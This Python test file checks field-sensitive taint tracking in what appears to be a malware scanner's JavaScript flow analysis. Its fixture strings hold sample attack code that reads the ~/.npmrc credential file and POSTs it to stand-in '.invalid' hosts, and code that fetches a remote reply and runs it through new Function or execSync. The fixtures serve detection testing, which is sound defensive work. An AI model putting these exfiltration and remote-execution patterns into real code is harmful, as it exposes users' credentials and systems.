"""One level of field sensitivity in the JavaScript flow analysis (release item 59, notes/60, its review
section): `x.f = v` stores into x's field f, so a read of another field does not carry v, while every
way of using the object whole still does.

Fixtures name hosts under `.invalid`; nothing in them is run.
"""

from __future__ import annotations

from typing import ClassVar

import pytest

from cordon_scanner.analysis.javascript.js_flow import JsFlow


class FieldKit:
    #: A credential file read (secret_file) and a send (request), as in test_js_flow.py.
    HEAD: ClassVar[str] = (
        'const fs = require("fs");\n'
        'const secret = fs.readFileSync(require("os").homedir() + "/.npmrc");\n'
    )
    SEND: ClassVar[str] = 'fetch("https://a.invalid/u", {method: "POST", body: %s});\n'

    @staticmethod
    def sends(text: str) -> bool:
        return any(f.sink == "request" and "secret_file" in f.sources for f in JsFlow.flows(text))

    @staticmethod
    def runs_reply(text: str) -> bool:
        """A reply reaching an evaluator or a child process: the two sinks REMOTE_CODE reads."""
        return any(
            f.sink in ("execute", "process") and "network_response" in f.sources
            for f in JsFlow.flows(text)
        )


class TestAnotherFieldIsNotTheStoredOne:
    SHAPE: ClassVar[str] = (
        "class Panel {\n"
        "  async load(url) {\n"
        "    const r = await fetch(url);\n"
        "    this.data = await r.json();\n"
        "  }\n"
        "  warn() {\n"
        '    show({ text: this.data.message, template: document.querySelector("#t") });\n'
        "  }\n"
        "}\n"
        "function show(opts) {\n"
        "  %s\n"
        "  return new Function(`return ${attr}`)();\n"
        "}\n"
    )

    def test_a_template_field_beside_a_reply_field_is_not_run(self) -> None:
        # The uikit-web shape (notes/60): the reply is stored on one field, another is evaluated.
        body = 'const attr = opts.template.getAttribute("value");'
        assert not FieldKit.runs_reply(self.SHAPE % body)

    def test_the_reply_field_itself_is_still_run(self) -> None:
        assert FieldKit.runs_reply(self.SHAPE % "const attr = opts.text;")

    def test_a_stored_credential_reaches_any_field_read(self) -> None:
        # What is sent is never narrowed by field (`Taint.NARROWED`): malware hides what it sends
        # inside objects, so over-approximating what an object carries is the safe side.
        text = FieldKit.HEAD + "const box = {};\nbox.key = secret;\n" + FieldKit.SEND % "box.name"
        assert FieldKit.sends(text)

    REPLY: ClassVar[str] = (
        'async function go() {\n  const r = await fetch("https://h.invalid/x");\n'
        "  const box = {};\n  box.key = await r.text();\n  new Function(%s)();\n}\n"
    )

    def test_a_stored_reply_and_another_field_run(self) -> None:
        assert not FieldKit.runs_reply(self.REPLY % "box.name")

    def test_the_stored_reply_run(self) -> None:
        assert FieldKit.runs_reply(self.REPLY % "box.key")

    def test_the_stored_field_read(self) -> None:
        text = FieldKit.HEAD + "const box = {};\nbox.key = secret;\n" + FieldKit.SEND % "box.key"
        assert FieldKit.sends(text)


class TestEveryWholeUseKeepsTheFlow:
    @pytest.mark.parametrize(
        "use",
        [
            "box",
            "JSON.stringify(box)",
            "{...box}",
            "Object.assign({}, box)",
            "structuredClone(box)",
        ],
    )
    def test_the_object_used_whole(self, use: str) -> None:
        text = FieldKit.HEAD + "const box = {};\nbox.key = secret;\n" + FieldKit.SEND % use
        assert FieldKit.sends(text)

    def test_a_computed_key_stays_whole_object(self) -> None:
        text = FieldKit.HEAD + 'const box = {};\nconst k = "key";\nbox[k] = secret;\n'
        assert FieldKit.sends(text + FieldKit.SEND % "box.other")


class TestTheFiveCasesThatMustKeepTheirFlows:
    """The outer layer's review of notes/60: each of these keeps its flow, or field sensitivity is
    the evasion."""

    def test_aliasing(self) -> None:
        text = (
            FieldKit.HEAD + "const x = {};\nconst y = x;\ny.f = secret;\n" + FieldKit.SEND % "x.f"
        )
        assert FieldKit.sends(text)

    @pytest.mark.parametrize("form", ["const {f} = x;\n", "let f;\n({f} = x);\n"])
    def test_destructuring(self, form: str) -> None:
        text = FieldKit.HEAD + "const x = {};\nx.f = secret;\n" + form + FieldKit.SEND % "f"
        assert FieldKit.sends(text)

    def test_this_across_methods(self) -> None:
        text = (
            FieldKit.HEAD
            + "class C {\n  keep() { this.f = secret; }\n  go() { "
            + FieldKit.SEND.strip() % "this.f"
            + " }\n}\n"
        )
        assert FieldKit.sends(text)

    @pytest.mark.parametrize(
        "copy", ["Object.assign(y, x)", "y = {...x}", "y = structuredClone(x)"]
    )
    def test_copies(self, copy: str) -> None:
        text = (
            FieldKit.HEAD
            + f"const x = {{}};\nx.f = secret;\nlet y = {{}};\n{copy};\n"
            + FieldKit.SEND % "y.f"
        )
        assert FieldKit.sends(text)

    def test_nesting(self) -> None:
        text = FieldKit.HEAD + "const x = {f: {}};\nx.f.g = secret;\n" + FieldKit.SEND % "x.f"
        assert FieldKit.sends(text)


class TestParameterFields:
    def test_a_helper_sending_another_field_of_its_argument_still_sends(self) -> None:
        text = (
            FieldKit.HEAD
            + "function post(o) { "
            + FieldKit.SEND.strip() % "o.name"
            + " }\npost({ key: secret, name: 'n' });\n"
        )
        assert FieldKit.sends(text)

    def test_a_helper_running_another_field_of_its_argument_runs_nothing(self) -> None:
        text = (
            'async function go() {\n  const r = await fetch("https://h.invalid/x");\n'
            "  run({ key: await r.text(), name: 'n' });\n}\n"
            "function run(o) { new Function(o.name)(); }\n"
        )
        assert not FieldKit.runs_reply(text)

    def test_a_helper_reading_the_tainted_field(self) -> None:
        text = (
            FieldKit.HEAD
            + "function post(o) { "
            + FieldKit.SEND.strip() % "o.key"
            + " }\npost({ key: secret, name: 'n' });\n"
        )
        assert FieldKit.sends(text)

    def test_an_argument_of_unknown_shape_is_whole(self) -> None:
        text = (
            FieldKit.HEAD
            + "function post(o) { "
            + FieldKit.SEND.strip() % "o.name"
            + " }\npost(secret);\n"
        )
        assert FieldKit.sends(text)


class TestTheDiffReview:
    """The outer layer's review of 7b361a11, and the computed-store regression its quick signal found."""

    def test_a_name_rebound_after_use_is_no_alias(self) -> None:
        text = (
            FieldKit.HEAD
            + "const x = {};\nconst other = {};\nlet y = x;\ny.f = secret;\n"
            + FieldKit.SEND % "y.f"
            + "y = other;\n"
        )
        assert FieldKit.sends(text)

    def test_a_name_bound_in_two_branches_is_no_alias(self) -> None:
        text = (
            FieldKit.HEAD
            + "const x = {}, z = {};\nlet y;\nif (Math.random() > 0.5) { y = x; } else { y = z; }\n"
            + "y.f = secret;\n"
            + FieldKit.SEND % "y.f"
        )
        assert FieldKit.sends(text)

    def test_a_computed_store_of_a_name_into_an_object_keeps_its_fields(self) -> None:
        # `info.extra[key] = value` was recorded as `info` aliasing `value` (quick signal, notes/60).
        text = (
            FieldKit.HEAD
            + "let info = { key: secret };\ninfo.extra[name] = value;\n"
            + FieldKit.SEND % "JSON.stringify(info)"
        )
        assert FieldKit.sends(text)

    def test_past_the_field_cap_an_object_is_whole_again(self) -> None:
        from cordon_scanner.analysis.javascript.flow.bindings import Bindings

        stores = "".join(f"box.f{n} = {n};\n" for n in range(Bindings.MAX_FIELDS + 5))
        text = (
            FieldKit.HEAD
            + "const box = {};\n"
            + stores
            + "box.key = secret;\n"
            + FieldKit.SEND % "box.other"
        )
        assert FieldKit.sends(text)  # collapsed: whole-object, as before field sensitivity

    def test_destructuring_takes_the_object_whole_and_aliases_nothing(self) -> None:
        # Pinned (review point 3): `const {f} = x` gives f all of x; a write through f is f's own.
        text = FieldKit.HEAD + "const x = {};\nconst {f} = x;\nf.k = secret;\n"
        assert not FieldKit.sends(text + FieldKit.SEND % "x.k")
        assert FieldKit.sends(text + FieldKit.SEND % "f.k")

    @pytest.mark.parametrize(("read", "runs"), [("box?.key", True), ("box?.name", False)])
    def test_optional_chaining_reads_like_a_dot(self, read: str, runs: bool) -> None:
        assert FieldKit.runs_reply(TestAnotherFieldIsNotTheStoredOne.REPLY % read) is runs


class TestTheShapeTheQuickSignalFound:
    """yt-smm 1.0.0's lost hit, by its role-normalised shape (scratchpad i59q/): a reply stored on one
    field of an object and a command built from another field of it is not "runs what a server sends".
    The unit still blocks on seven other evidence families; the hit was the whole-object reading."""

    SHAPE: ClassVar[str] = (
        'const { execSync } = require("child_process");\n'
        'const https = require("https");\n'
        "const conf = { hostname: 'h' };\n"
        'https.get("https://h.invalid/x", (res) => {\n'
        '  let body = "";\n'
        '  res.on("data", (d) => body += d);\n'
        "  conf.%s = body;\n"
        "});\n"
        'execSync("ping -c 1 " + (conf.hostname) + " >/dev/null", {});\n'
    )

    def test_a_reply_on_another_field_is_not_the_command(self) -> None:
        assert not FieldKit.runs_reply(self.SHAPE % "reply")

    def test_a_reply_on_the_commands_field_is(self) -> None:
        assert FieldKit.runs_reply(self.SHAPE % "hostname")
